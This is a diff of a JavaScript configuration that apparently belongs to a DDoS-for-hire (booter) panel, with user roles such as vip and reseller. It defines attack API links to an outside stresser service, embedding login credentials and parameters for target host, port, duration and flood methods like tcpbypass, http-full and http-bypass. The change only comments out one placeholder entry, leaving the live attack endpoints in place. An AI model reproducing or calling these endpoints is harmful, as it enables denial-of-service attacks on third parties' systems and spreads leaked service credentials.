@@ -51,7 +51,7 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: false, holder: false },
       api_links: [
-        { name: 'XSERVICES', url: 'https://your-api1.com/api/attack?username=paid&password=paidd&host={target}&port={port}&time={duration}&method={method}', method: 'GET' },
+//      { name: 'XSERVICES', url: 'https://your-api1.com/api/attack?username=paid&password=paidd&host={target}&port={port}&time={duration}&method={method}', method: 'GET' },
         { name: 'VahnNetwork', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=tcp-legit', method: 'GET' },
         { name: 'VahnNetworks', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=tcpboom', method: 'GET' },
         { name: 'VahnNetworkss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=tcpbypass', method: 'GET' },
@@ -71,7 +71,7 @@ export const DEFAULT_PAYLOAD = {
       roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
       plan_restrictions: { vip: false, holder: false },
       api_links: [
-        { name: 'XSERVICES', url: 'https://your-api1.com/api/attack?username=paid&password=paidd&host={target}&port={port}&time={duration}&method={method}', method: 'GET' },
+//      { name: 'XSERVICES', url: 'https://your-api1.com/api/attack?username=paid&password=paidd&host={target}&port={port}&time={duration}&method={method}', method: 'GET' },
         { name: 'VahnNetwork', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=browser', method: 'GET' },
         { name: 'VahnNetworks', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=http-full', method: 'GET' },
         { name: 'VahnNetworkss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=http-bypass', method: 'GET' },
